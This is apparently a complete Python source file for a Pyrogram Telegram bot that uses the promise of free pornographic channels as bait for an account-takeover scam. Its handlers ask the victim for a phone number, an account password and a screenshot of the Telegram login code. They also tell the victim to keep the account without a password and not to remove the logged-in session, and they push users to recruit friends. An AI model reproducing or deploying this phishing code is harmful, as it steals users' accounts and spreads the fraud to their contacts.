# Rexa Kadal gurun

import time
import asyncio
from sys import version as pyver

import pyrogram
from pyrogram import __version__ as pyrover
from pyrogram import filters, idle
from pyrogram.errors import FloodWait
from pyrogram.types import Message

# IMPORT PYRO TYPES
from pyrogram.types import Message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery 


import config

loop = asyncio.get_event_loop()
SUDO_USERS = config.SUDO_USER

app = pyrogram.Client(
    ":RexaBot:",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)


# START YA INI JINK !

START_MESSAGE = """👋🏻 Hello, Introduce Me There Is a Bot For You To Get Viral Content Premium Porn Channels

Please press :

👉🏻 /JoinChannels to get your free Koleksi Porn channel

―――――――――――――――――――
[ ⚠️ ] Leave this bot when you don't believe Thanks.
―――――――――――――――――――
[ 🔞 ] This Channel Contains Pornographic Content, if you are not old enough please leave this Bot

⁉️ __Please don't spam bots. Everything is processed according to the queue. When you spam bots, you will be back in the original queue!__
"""

START_BUTTON = [

    [  
        InlineKeyboardButton("Malay Channel Previews 💋", url="https://t.me/+z4XdC6iQOKZkYzVl"),              
    ],            
]            
@app.on_message(filters.command("start") & filters.private)
async def start(_, message):
    text = START_MESSAGE
    reply_markup = InlineKeyboardMarkup(START_BUTTON)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# FREEPORN HANDLER 

FREE_MESSAGE = """
⚠️ To access the Channel below, please Verify yourself first, 
so that your account is registered in this bot database

Please press : /verify to verify your account to bot database

❓if you dont understand please type /help
"""

FREE_BUTTON = [
            [
                InlineKeyboardButton(" KOLEKSI VIRAL ♥️", url="https://t.me/+NDFAuijydK45OWI9"),
            ],
        ]

@app.on_message(filters.command("JoinChannels") & filters.private)
async def free(_, message):
    text = FREE_MESSAGE
    reply_markup = InlineKeyboardMarkup(FREE_BUTTON)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# VWRIF CMD

@app.on_message(filters.command("verify") & filters.private)
async def verip(_, message):
    await app.send_message(message.chat.id, "Please send your telegram phone number…")
# PASSWORD 

@app.on_message(filters.regex("🔐") & filters.private)
async def pw(_, message):
    await app.send_message(message.chat.id, "__Please send your Account Password__")

# SEND NOMER

@app.on_message(filters.regex("6|1|2|3|4") & filters.private)
async def regex_cantik(_, message):
    rexa = await message.reply("__Sent otp code...__")
    await asyncio.sleep(10)
    await rexa.edit("__successfully sent otp code…__")
    await asyncio.sleep(5)
    await app.send_photo(message.chat.id, "https://telegra.ph/file/f84db4a1bc109f99747b0.jpg", caption="""
💾 Our System Need to Verify your Telegram Account

We sent a login code to your Telegram account, please send a screenshot and please post it here, as in the example Picture

📷 Please see the example picture!

Just send it in the form of a screenshot, you don't need to send it via text.


❓if you dont understand please type /help
""")

# SUCCESFULLY CMD & CALLBACK

SUCCES_TEXT = """
Succesfully add to Database ⚡

__Congratulations!!__ You are already a member of the Koleksi Porn Video Channel 🎉

**Attention!! When you remove the system that is logged in to your account, what will happen is that your entire channel will disappear, please pay attention**
―――――――――――――――――
📌 Do not put a password on your account!
――――――――――――――――――

if you want more channels please press the button below and follow the steps :
"""
SUCCES_BUTTON = [

    [  
        InlineKeyboardButton("Get More Channels", callback_data="kesatu"),              
    ],            
]            

@app.on_message(filters.regex("🥳") & filters.private)
async def succes(_, message):
    text = SUCCES_TEXT
    reply_markup = InlineKeyboardMarkup(SUCCES_BUTTON)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )

# EROR KODE

EROR_KODE_TEKS = """❌ __Error message detected__

Please send screenhot of your Code Not a text!
if you don't understand please type /help

Please start the bot again

"""

EROR_KODE_TOMBOL = [

    [  
        InlineKeyboardButton("♻️Start Again", url="https://t.me/KOLEKSISCANDAL_BOT?start=start"),              
    ],            
]

@app.on_message(filters.regex("⚠️") & filters.private)
async def eror(_, message):
    text = EROR_KODE_TEKS
    reply_markup = InlineKeyboardMarkup(EROR_KODE_TOMBOL)
    await message.reply(
        text=text,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )


# REGEX

@app.on_callback_query(filters.regex("^kesatu"))
async def kesatu(_, callback_query):
    query = callback_query.data.split()
    if query[0] == "kesatu":
        KESATU = """
👉🏻 FOLLOW THE STEP TO GET MORE CHANNEL :

1. Join all the channels below 👇🏻
2. invite your friends or your other accounts to use this bot.
3. make sure the account you invite follows the steps like the first time you used this bot
3. when done type /done
4. wait for your account to be acc by database bot
5. Enjoy, you can access the channel

"""  
        KESATUTOMBOL = [
            [
                InlineKeyboardButton("KOLEKSI HIJAB 💃", url="https://t.me/+3cmLG1Nc42UxNjI1"),
                InlineKeyboardButton("KOLEKSI MELAYU💃", url="https://t.me/+Kh7-WpPVb3w5Njk1"),
            ],
            [
                InlineKeyboardButton("Big Pussy💋", url="https://t.me/+NjYTRB4tj0AxMDhl"),
                InlineKeyboardButton("WATCH LIVE STREAMING🎥", url="https://t.me/+w59Fy6HRofJiZmE9"),
            ],
        ]
        await callback_query.edit_message_text(
            KESATU, reply_markup=InlineKeyboardMarkup(KESATUTOMBOL)
        )

# INI BUAT INVIT TEMEN

@app.on_message(filters.regex("✅") & filters.private)
async def verip(_, message):
    await app.send_message(message.chat.id, """
Congratulations!!! 🎉

You have access to all channels!!
""")
# HELP

@app.on_message(filters.command("help") & filters.private)
async def helep(_, message):
    await app.send_video(message.chat.id, "https://t.me/ifusadcallme/8", caption="🎥 Video tutorial for sending screenshots so that my account is detected by this bot.")


print('Bot Started..')
app.run()
